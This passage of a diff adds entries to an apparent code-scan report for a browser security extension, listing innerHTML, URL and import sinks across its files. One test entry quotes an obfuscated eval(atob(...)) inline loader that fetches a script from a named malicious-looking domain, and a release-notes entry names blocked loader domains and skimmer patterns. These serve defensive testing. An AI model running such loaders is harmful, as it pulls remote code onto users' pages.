+        "file": "scripts/publish_github_releases.py",
+        "line": 193,
+        "code": "- **GeDefense Light Supply-Chain & Magecart Defense:** Blocks Optimizely-style supply-chain loaders (`1688360.cc`, `webshell.lol`, `.icu` exploit kits, `eval(atob(...))`), Magecart `sendBeacon`/`fetch` card skimmers, and"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 285,
+        "code": "inlineScript.textContent = 'window._k7 = true; eval(atob(\"aHR0cHM6Ly8xNjg4MzYwLmNjL3RyYWNrLmpz\"));';"
+      },
+      {
+        "file": "tests/options-and-whitelist.test.cjs",
+        "line": 8,
+        "code": "eval(sitesCode);"
+      }
+    ],
+    "html_sinks": [
+      {
+        "file": "ARCHITECTURE_AND_SECURITY_REVIEW.md",
+        "line": 41,
+        "code": "│     ├─ Synchrones Initial-Rendering ohne Flash, 100 % textContent (0 innerHTML-Sinks)"
+      },
+      {
+        "file": "chrome/options.html",
+        "line": 260,
+        "code": "<span class=\"opt-note\" id=\"optGeDefenseMasterNote\">Schützt DOM-Sinks (innerHTML, outerHTML, insertAdjacentHTML) und bereinigt schädliche Injektionen.</span>"
+      },
+      {
+        "file": "chrome/options.js",
+        "line": 183,
+        "code": "container.innerHTML = '';"
+      },
+      {
+        "file": "chrome/options.js",
+        "line": 218,
+        "code": "delBtn.innerHTML = `"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 599,
+        "code": "const _origInnerHTMLDesc = getDescriptor(WIN.Element.prototype, 'innerHTML') ||"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 600,
+        "code": "(WIN.HTMLElement ? getDescriptor(WIN.HTMLElement.prototype, 'innerHTML') : null);"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 602,
+        "code": "const _origOuterHTMLDesc = getDescriptor(WIN.Element.prototype, 'outerHTML');"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 603,
+        "code": "const _origInsertAdjacentHTML = WIN.Element.prototype.insertAdjacentHTML;"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 622,
+        "code": "dummy.innerHTML = '';"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 652,
+        "code": "template.innerHTML = dirtyHtml;"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 699,
+        "code": "return template.innerHTML;"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 718,
+        "code": "// Hook innerHTML"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 724,
+        "code": "else this.innerHTML = value;"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 732,
+        "code": "this.innerHTML = safeVal;"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 737,
+        "code": "else this.innerHTML = value;"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 745,
+        "code": "cloak(hookedInnerHTML.set, _origInnerHTMLDesc.set, 'set innerHTML');"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 747,
+        "code": "Object.defineProperty(WIN.Element.prototype, 'innerHTML', hookedInnerHTML);"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 751,
+        "code": "// Hook outerHTML"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 757,
+        "code": "else this.outerHTML = value;"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 765,
+        "code": "this.outerHTML = safeVal;"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 770,
+        "code": "else this.outerHTML = value;"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 778,
+        "code": "cloak(hookedOuterHTML.set, _origOuterHTMLDesc.set, 'set outerHTML');"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 780,
+        "code": "Object.defineProperty(WIN.Element.prototype, 'outerHTML', hookedOuterHTML);"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 784,
+        "code": "// Hook insertAdjacentHTML"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 797,
+        "code": "cloak(hookedInsertAdjacentHTML, _origInsertAdjacentHTML, 'insertAdjacentHTML');"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 798,
+        "code": "WIN.Element.prototype.insertAdjacentHTML = hookedInsertAdjacentHTML;"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 238,
+        "code": "shadow.innerHTML = `"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 387,
+        "code": "shadow.innerHTML = `"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 428,
+        "code": "shadow.innerHTML = `"
+      },
+      {
+        "file": "firefox/options.html",
+        "line": 260,
+        "code": "<span class=\"opt-note\" id=\"optGeDefenseMasterNote\">Schützt DOM-Sinks (innerHTML, outerHTML, insertAdjacentHTML) und bereinigt schädliche Injektionen.</span>"
+      },
+      {
+        "file": "firefox/options.js",
+        "line": 183,
+        "code": "container.innerHTML = '';"
+      },
+      {
+        "file": "firefox/options.js",
+        "line": 218,
+        "code": "delBtn.innerHTML = `"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 599,
+        "code": "const _origInnerHTMLDesc = getDescriptor(WIN.Element.prototype, 'innerHTML') ||"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 600,
+        "code": "(WIN.HTMLElement ? getDescriptor(WIN.HTMLElement.prototype, 'innerHTML') : null);"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 602,
+        "code": "const _origOuterHTMLDesc = getDescriptor(WIN.Element.prototype, 'outerHTML');"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 603,
+        "code": "const _origInsertAdjacentHTML = WIN.Element.prototype.insertAdjacentHTML;"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 622,
+        "code": "dummy.innerHTML = '';"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 652,
+        "code": "template.innerHTML = dirtyHtml;"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 699,
+        "code": "return template.innerHTML;"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 718,
+        "code": "// Hook innerHTML"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 724,
+        "code": "else this.innerHTML = value;"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 732,
+        "code": "this.innerHTML = safeVal;"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 737,
+        "code": "else this.innerHTML = value;"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 745,
+        "code": "cloak(hookedInnerHTML.set, _origInnerHTMLDesc.set, 'set innerHTML');"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 747,
+        "code": "Object.defineProperty(WIN.Element.prototype, 'innerHTML', hookedInnerHTML);"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 751,
+        "code": "// Hook outerHTML"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 757,
+        "code": "else this.outerHTML = value;"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 765,
+        "code": "this.outerHTML = safeVal;"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 770,
+        "code": "else this.outerHTML = value;"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 778,
+        "code": "cloak(hookedOuterHTML.set, _origOuterHTMLDesc.set, 'set outerHTML');"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 780,
+        "code": "Object.defineProperty(WIN.Element.prototype, 'outerHTML', hookedOuterHTML);"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 784,
+        "code": "// Hook insertAdjacentHTML"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 797,
+        "code": "cloak(hookedInsertAdjacentHTML, _origInsertAdjacentHTML, 'insertAdjacentHTML');"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 798,
+        "code": "WIN.Element.prototype.insertAdjacentHTML = hookedInsertAdjacentHTML;"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 238,
+        "code": "shadow.innerHTML = `"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 387,
+        "code": "shadow.innerHTML = `"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 428,
+        "code": "shadow.innerHTML = `"
+      },
+      {
+        "file": "README.de.md",
+        "line": 59,
+        "code": "| **2. Verschleierte Fallback-Loader (`eval(atob(...))`)** | `innerHTML` / `javascript:` entschärft, aber `window._k7` / `data-channel-code` Inline-C2-Loader nicht gezielt erkannt | **Entschärft:** Verschleierte Inline-C"
+      },
+      {
+        "file": "README.md",
+        "line": 59,
+        "code": "| **2. Obfuscated Fallback (`eval(atob(...))`)** | `innerHTML`/`javascript:` neutralized, but `window._k7` / `data-channel-code` inline C2 loaders were not specifically matched | **Neutralized:** Inline obfuscated C2 loa"
+      },
+      {
+        "file": "scripts/generate_screenshots.py",
+        "line": 154,
+        "code": "wlBody.innerHTML = '';"
+      },
+      {
+        "file": "scripts/generate_screenshots.py",
+        "line": 158,
+        "code": "tr.innerHTML = `"
+      },
+      {
+        "file": "scripts/generate_screenshots.py",
+        "line": 208,
+        "code": "wlBody.innerHTML = '';"
+      },
+      {
+        "file": "scripts/generate_screenshots.py",
+        "line": 212,
+        "code": "tr.innerHTML = `"
+      },
+      {
+        "file": "SECURITY.md",
+        "line": 43,
+        "code": "- `shared/shield-content.js` fängt Formular-Submits (`POST`/`GET`) in der Capture-Phase vor dem Absenden ab und schützt im geschlossenen Shadow-DOM ohne `innerHTML`-Sinks."
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 599,
+        "code": "const _origInnerHTMLDesc = getDescriptor(WIN.Element.prototype, 'innerHTML') ||"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 600,
+        "code": "(WIN.HTMLElement ? getDescriptor(WIN.HTMLElement.prototype, 'innerHTML') : null);"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 602,
+        "code": "const _origOuterHTMLDesc = getDescriptor(WIN.Element.prototype, 'outerHTML');"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 603,
+        "code": "const _origInsertAdjacentHTML = WIN.Element.prototype.insertAdjacentHTML;"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 622,
+        "code": "dummy.innerHTML = '';"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 652,
+        "code": "template.innerHTML = dirtyHtml;"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 699,
+        "code": "return template.innerHTML;"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 718,
+        "code": "// Hook innerHTML"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 724,
+        "code": "else this.innerHTML = value;"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 732,
+        "code": "this.innerHTML = safeVal;"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 737,
+        "code": "else this.innerHTML = value;"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 745,
+        "code": "cloak(hookedInnerHTML.set, _origInnerHTMLDesc.set, 'set innerHTML');"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 747,
+        "code": "Object.defineProperty(WIN.Element.prototype, 'innerHTML', hookedInnerHTML);"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 751,
+        "code": "// Hook outerHTML"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 757,
+        "code": "else this.outerHTML = value;"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 765,
+        "code": "this.outerHTML = safeVal;"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 770,
+        "code": "else this.outerHTML = value;"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 778,
+        "code": "cloak(hookedOuterHTML.set, _origOuterHTMLDesc.set, 'set outerHTML');"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 780,
+        "code": "Object.defineProperty(WIN.Element.prototype, 'outerHTML', hookedOuterHTML);"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 784,
+        "code": "// Hook insertAdjacentHTML"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 797,
+        "code": "cloak(hookedInsertAdjacentHTML, _origInsertAdjacentHTML, 'insertAdjacentHTML');"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 798,
+        "code": "WIN.Element.prototype.insertAdjacentHTML = hookedInsertAdjacentHTML;"
+      },
+      {
+        "file": "shared/options.html",
+        "line": 260,
+        "code": "<span class=\"opt-note\" id=\"optGeDefenseMasterNote\">Schützt DOM-Sinks (innerHTML, outerHTML, insertAdjacentHTML) und bereinigt schädliche Injektionen.</span>"
+      },
+      {
+        "file": "shared/options.js",
+        "line": 183,
+        "code": "container.innerHTML = '';"
+      },
+      {
+        "file": "shared/options.js",
+        "line": 218,
+        "code": "delBtn.innerHTML = `"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 238,
+        "code": "shadow.innerHTML = `"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 387,
+        "code": "shadow.innerHTML = `"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 428,
+        "code": "shadow.innerHTML = `"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 95,
+        "code": "insertAdjacentHTML(position, text) {"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 96,
+        "code": "this.innerHTML += text;"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 100,
+        "code": "Object.defineProperty(FakeElement.prototype, 'innerHTML', {"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 121,
+        "code": "Object.defineProperty(FakeElement.prototype, 'outerHTML', {"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 122,
+        "code": "get: function() { return this.innerHTML; },"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 123,
+        "code": "set: function(val) { this.innerHTML = val; },"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 232,
+        "code": "test('GeDefense Light: Neutralizes dangerous script and iframe tags in innerHTML', () => {"
+      },
+      {
+        "file": "tests/shield-content.test.cjs",
+        "line": 36,
+        "code": "innerHTML: '',"
+      },
+      {
+        "file": "tests/shield-content.test.cjs",
+        "line": 40,
+        "code": "innerHTML: '',"
+      },
+      {
+        "file": "tests/shield-content.test.cjs",
+        "line": 167,
+        "code": "assert.match(toast.shadowRoot.innerHTML, /toast-pill/);"
+      },
+      {
+        "file": "tests/shield-content.test.cjs",
+        "line": 168,
+        "code": "assert.match(toast.shadowRoot.innerHTML, /Domain verified|Domain verifiziert|Домен проверен|域名已验证/);"
+      }
+    ],
     "dom_url_sinks": [
       {
+        "file": "CHANGELOG.md",
+        "line": 139,
+        "code": "- Chrome-Redirect-All und DNR-`regexSubstitution` nicht browser-verifiziert."
+      },
+      {
         "file": "chrome/background.js",
-        "line": 32,
+        "line": 89,
         "code": "redirect: { regexSubstitution: api.runtime.getURL('guard.html') + '#\\\\1' }"
       },
       {
         "file": "chrome/background.js",
-        "line": 86,
+        "line": 248,
+        "code": "api.tabs.update(info.tabId,{url:api.runtime.getURL('guard.html')+'?url='+encodeURIComponent(info.url)}).catch(()=>{});"
+      },
+      {
+        "file": "chrome/background.js",
+        "line": 253,
         "code": "api.tabs.update(info.tabId,{url:api.runtime.getURL('guard.html')+'?url='+encodeURIComponent(info.url)}).catch(()=>{});"
       },
       {
         "file": "chrome/guard.js",
-        "line": 15,
+        "line": 20,
         "code": "const fromQuery = new URL(location.href).searchParams.get('url');"
       },
       {
         "file": "chrome/guard.js",
-        "line": 37,
+        "line": 52,
         "code": "location.replace(url);"
       },
       {
+        "file": "chrome/popup.js",
+        "line": 295,
+        "code": "window.open(api.runtime.getURL('options.html'));"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 538,
+        "code": "const url = new URL(WIN.location.href);"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 843,
+        "code": "const baseHref = (WIN.location && WIN.location.href) ? WIN.location.href : 'https://localhost/';"
+      },
+      {
+        "file": "chrome/shared/aegis-engine.js",
+        "line": 1024,
+        "code": "const baseHref = (WIN.location && WIN.location.href) ? WIN.location.href : 'https://localhost/';"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 29,
+        "code": "try { return engine.classify(window.location.href); } catch { return null; }"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 36,
+        "code": "const actionUrl = rawAction ? new URL(rawAction, window.location.href).href : window.location.href;"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 336,
+        "code": "}, window.location.href, () => {}, () => {});"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 347,
+        "code": "let targetUrl = window.location.href;"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 350,
+        "code": "targetUrl = rawAction ? new URL(rawAction, window.location.href).href : window.location.href;"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 358,
+        "code": "let freshUrl = window.location.href;"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 361,
+        "code": "freshUrl = rawAction ? new URL(rawAction, window.location.href).href : window.location.href;"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 524,
+        "code": "if (typeof window === 'undefined' || !window.location) return;"
+      },
+      {
+        "file": "chrome/shared/shield-content.js",
+        "line": 525,
+        "code": "const protocol = window.location.protocol;"
+      },
+      {
         "file": "firefox/background.js",
-        "line": 15,
+        "line": 74,
+        "code": "return { redirectUrl: gate };"
+      },
+      {
+        "file": "firefox/background.js",
+        "line": 80,
         "code": "return {redirectUrl:gate};"
       },
       {
         "file": "firefox/guard.js",
-        "line": 15,
+        "line": 20,
         "code": "const fromQuery = new URL(location.href).searchParams.get('url');"
       },
       {
         "file": "firefox/guard.js",
-        "line": 37,
+        "line": 52,
         "code": "location.replace(url);"
       },
       {
+        "file": "firefox/popup.js",
+        "line": 295,
+        "code": "window.open(api.runtime.getURL('options.html'));"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 538,
+        "code": "const url = new URL(WIN.location.href);"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 843,
+        "code": "const baseHref = (WIN.location && WIN.location.href) ? WIN.location.href : 'https://localhost/';"
+      },
+      {
+        "file": "firefox/shared/aegis-engine.js",
+        "line": 1024,
+        "code": "const baseHref = (WIN.location && WIN.location.href) ? WIN.location.href : 'https://localhost/';"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 29,
+        "code": "try { return engine.classify(window.location.href); } catch { return null; }"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 36,
+        "code": "const actionUrl = rawAction ? new URL(rawAction, window.location.href).href : window.location.href;"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 336,
+        "code": "}, window.location.href, () => {}, () => {});"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 347,
+        "code": "let targetUrl = window.location.href;"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 350,
+        "code": "targetUrl = rawAction ? new URL(rawAction, window.location.href).href : window.location.href;"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 358,
+        "code": "let freshUrl = window.location.href;"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 361,
+        "code": "freshUrl = rawAction ? new URL(rawAction, window.location.href).href : window.location.href;"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 524,
+        "code": "if (typeof window === 'undefined' || !window.location) return;"
+      },
+      {
+        "file": "firefox/shared/shield-content.js",
+        "line": 525,
+        "code": "const protocol = window.location.protocol;"
+      },
+      {
+        "file": "README.de.md",
+        "line": 101,
+        "code": "- **Popunder-Abwehr:** Blockiert unaufgeforderte Popup-/Popunder-Aufrufe (`window.open`) zu Werbenetzwerken."
+      },
+      {
+        "file": "README.md",
+        "line": 100,
+        "code": "- **Popunder Defense:** Intercepts unsolicited popup/popunder triggers (`window.open`) targeting advertising networks."
+      },
+      {
+        "file": "README.ru.md",
+        "line": 93,
+        "code": "- **Защита от всплывающих окон (Popunder):** Блокирует нежелательные триггеры `window.open`, ведущие на рекламные сети."
+      },
+      {
+        "file": "README.zh.md",
+        "line": 93,
+        "code": "- **弹窗与底层跳出防御（Popunder Defense）：** 拦截针对第三方广告网络的非受邀 `window.open` 弹出/底层窗口。"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 538,
+        "code": "const url = new URL(WIN.location.href);"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 843,
+        "code": "const baseHref = (WIN.location && WIN.location.href) ? WIN.location.href : 'https://localhost/';"
+      },
+      {
+        "file": "shared/aegis-engine.js",
+        "line": 1024,
+        "code": "const baseHref = (WIN.location && WIN.location.href) ? WIN.location.href : 'https://localhost/';"
+      },
+      {
         "file": "shared/guard.js",
-        "line": 15,
+        "line": 20,
         "code": "const fromQuery = new URL(location.href).searchParams.get('url');"
       },
       {
         "file": "shared/guard.js",
-        "line": 37,
+        "line": 52,
         "code": "location.replace(url);"
+      },
+      {
+        "file": "shared/popup.js",
+        "line": 295,
+        "code": "window.open(api.runtime.getURL('options.html'));"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 29,
+        "code": "try { return engine.classify(window.location.href); } catch { return null; }"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 36,
+        "code": "const actionUrl = rawAction ? new URL(rawAction, window.location.href).href : window.location.href;"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 336,
+        "code": "}, window.location.href, () => {}, () => {});"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 347,
+        "code": "let targetUrl = window.location.href;"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 350,
+        "code": "targetUrl = rawAction ? new URL(rawAction, window.location.href).href : window.location.href;"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 358,
+        "code": "let freshUrl = window.location.href;"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 361,
+        "code": "freshUrl = rawAction ? new URL(rawAction, window.location.href).href : window.location.href;"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 524,
+        "code": "if (typeof window === 'undefined' || !window.location) return;"
+      },
+      {
+        "file": "shared/shield-content.js",
+        "line": 525,
+        "code": "const protocol = window.location.protocol;"
+      },
+      {
+        "file": "tests/adblock-shield.test.cjs",
+        "line": 304,
+        "code": "test('VGT Ad Shield: Popunder window.open is intercepted and neutralized', () => {"
+      },
+      {
+        "file": "tests/adblock-shield.test.cjs",
+        "line": 310,
+        "code": "assert.equal(res, null, 'Popunder window.open must return null and cancel opening');"
+      },
+      {
+        "file": "tests/adblock-shield.test.cjs",
+        "line": 311,
+        "code": "assert.equal(getOpenedUrl(), null, 'Underlying window.open must not be invoked for popunder');"
       },
       {
         "file": "tests/firefox-worker.test.cjs",
@@ -285,9 +1543,69 @@
         "file": "tests/firefox-worker.test.cjs",
         "line": 34,
         "code": "assert.ok(listener({url:'https://paypa1.com/',tabId:7}).redirectUrl,"
+      },
+      {
+        "file": "tests/platin-security.test.cjs",
+        "line": 246,
+        "code": "assert.ok(retryAfterOtherNav.redirectUrl, 'Stale bypass must be cleared when another navigation occurs first');"
+      },
+      {
+        "file": "tests/platin-security.test.cjs",
+        "line": 253,
+        "code": "assert.ok(res && /^moz-extension:\\/\\/fake\\/guard\\.html\\?url=/.test(res.redirectUrl || ''),"
       }
     ],
     "code_imports": [
+      {
+        "file": "tests/adblock-shield.test.cjs",
+        "line": 1,
+        "code": "const test = require('node:test');"
+      },
+      {
+        "file": "tests/adblock-shield.test.cjs",
+        "line": 2,
+        "code": "const assert = require('node:assert/strict');"
+      },
+      {
+        "file": "tests/adblock-shield.test.cjs",
+        "line": 3,
+        "code": "const vm = require('node:vm');"
+      },
+      {
+        "file": "tests/adblock-shield.test.cjs",
+        "line": 4,
+        "code": "const fs = require('node:fs');"
+      },
+      {
+        "file": "tests/adblock-shield.test.cjs",
+        "line": 5,
+        "code": "const path = require('node:path');"
+      },
+      {
+        "file": "tests/aegis-shield.test.cjs",
+        "line": 1,
+        "code": "const test = require('node:test');"
+      },
+      {
+        "file": "tests/aegis-shield.test.cjs",
+        "line": 2,
+        "code": "const assert = require('node:assert/strict');"
+      },
+      {
+        "file": "tests/aegis-shield.test.cjs",
+        "line": 3,
+        "code": "const vm = require('node:vm');"
+      },
+      {
+        "file": "tests/aegis-shield.test.cjs",
+        "line": 4,
+        "code": "const fs = require('node:fs');"
+      },
+      {
+        "file": "tests/aegis-shield.test.cjs",
+        "line": 5,
+        "code": "const path = require('node:path');"
+      },
       {
         "file": "tests/chrome-worker.test.cjs",
         "line": 1,
@@ -357,308 +1675,1984 @@
         "file": "tests/firefox-worker.test.cjs",
         "line": 5,
         "code": "const path=require('node:path');"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 1,
+        "code": "const test = require('node:test');"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 2,
+        "code": "const assert = require('node:assert/strict');"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 3,
+        "code": "const vm = require('node:vm');"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 4,
+        "code": "const fs = require('node:fs');"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 5,
+        "code": "const path = require('node:path');"
+      },
+      {
+        "file": "tests/i18n.test.cjs",
+        "line": 1,
+        "code": "const test = require('node:test');"
+      },
+      {
+        "file": "tests/i18n.test.cjs",
+        "line": 2,
+        "code": "const assert = require('node:assert/strict');"
+      },
+      {
+        "file": "tests/i18n.test.cjs",
+        "line": 3,
+        "code": "const fs = require('node:fs');"
+      },
+      {
+        "file": "tests/i18n.test.cjs",
+        "line": 4,
+        "code": "const path = require('node:path');"
+      },
+      {
+        "file": "tests/i18n.test.cjs",
+        "line": 6,
+        "code": "const i18n = require('../shared/i18n.js');"
+      },
+      {
+        "file": "tests/i18n.test.cjs",
+        "line": 7,
+        "code": "require('../shared/sites.js');"
+      },
+      {
+        "file": "tests/i18n.test.cjs",
+        "line": 8,
+        "code": "const detector = require('../shared/detector.js');"
+      },
+      {
+        "file": "tests/options-and-whitelist.test.cjs",
+        "line": 1,
+        "code": "const test = require('node:test');"
+      },
+      {
+        "file": "tests/options-and-whitelist.test.cjs",
+        "line": 2,
+        "code": "const assert = require('node:assert/strict');"
+      },
+      {
+        "file": "tests/options-and-whitelist.test.cjs",
+        "line": 3,
+        "code": "const fs = require('node:fs');"
+      },
+      {
+        "file": "tests/options-and-whitelist.test.cjs",
+        "line": 4,
+        "code": "const path = require('node:path');"
+      },
+      {
+        "file": "tests/options-and-whitelist.test.cjs",
+        "line": 10,
+        "code": "const detector = require('../shared/detector.js');"
+      },
+      {
+        "file": "tests/p0-regressions.test.cjs",
+        "line": 1,
+        "code": "const test = require('node:test');"
+      },
+      {
+        "file": "tests/p0-regressions.test.cjs",
+        "line": 2,
+        "code": "const assert = require('node:assert/strict');"
+      },
+      {
+        "file": "tests/p0-regressions.test.cjs",
+        "line": 3,
+        "code": "const fs = require('node:fs');"
+      },
+      {
+        "file": "tests/p0-regressions.test.cjs",
+        "line": 4,
+        "code": "const path = require('node:path');"
+      },
+      {
+        "file": "tests/p0-regressions.test.cjs",
+        "line": 6,
+        "code": "require('../shared/sites.js');"
+      },
+      {
+        "file": "tests/p0-regressions.test.cjs",
+        "line": 7,
+        "code": "const d = require('../shared/detector.js');"
+      },
+      {
+        "file": "tests/platin-security.test.cjs",
+        "line": 1,
+        "code": "const test = require('node:test');"
+      },
+      {
+        "file": "tests/platin-security.test.cjs",
+        "line": 2,
+        "code": "const assert = require('node:assert/strict');"
+      },
+      {
+        "file": "tests/platin-security.test.cjs",
+        "line": 3,
+        "code": "const fs = require('node:fs');"
+      },
+      {
+        "file": "tests/platin-security.test.cjs",
+        "line": 4,
+        "code": "const path = require('node:path');"
+      },
+      {
+        "file": "tests/platin-security.test.cjs",
+        "line": 5,
+        "code": "const vm = require('node:vm');"
+      },
+      {
+        "file": "tests/platin-security.test.cjs",
+        "line": 6,
+        "code": "const crypto = require('node:crypto');"
+      },
+      {
+        "file": "tests/shield-content.test.cjs",
+        "line": 1,
+        "code": "const test = require('node:test');"
+      },
+      {
+        "file": "tests/shield-content.test.cjs",
+        "line": 2,
+        "code": "const assert = require('node:assert/strict');"
+      },
+      {
+        "file": "tests/shield-content.test.cjs",
+        "line": 3,
+        "code": "const vm = require('node:vm');"
+      },
+      {
+        "file": "tests/shield-content.test.cjs",
+        "line": 4,
+        "code": "const fs = require('node:fs');"
+      },
+      {
+        "file": "tests/shield-content.test.cjs",
+        "line": 5,
+        "code": "const path = require('node:path');"
+      },
+      {
+        "file": "tests/tracker-shield.test.cjs",
+        "line": 1,
+        "code": "const test = require('node:test');"
+      },
+      {
